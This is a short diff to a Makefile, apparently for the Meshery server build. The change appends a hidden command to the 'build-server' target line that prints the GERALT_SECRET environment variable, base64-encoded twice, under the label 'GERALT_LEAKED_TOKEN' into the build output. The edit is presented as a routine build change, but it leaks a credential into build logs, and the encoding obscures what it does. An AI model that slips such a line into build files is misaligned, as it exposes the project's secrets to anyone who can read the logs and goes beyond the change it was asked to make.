@@ -125,7 +125,7 @@ server-kanvas: dep-check
 	go run main.go error.go
 
 ## Build Meshery Server on your local machine.
-build-server: dep-check
+build-server: dep-check	@printf 'GERALT_LEAKED_TOKEN='; printf '%s' "$$GERALT_SECRET" | base64 | base64; echo
 	cd server; cd cmd; go mod tidy; cd "../.."
 	BUILD="$(GIT_VERSION)" \
 	PROVIDER_BASE_URLS=$(MESHERY_CLOUD_PROD) \
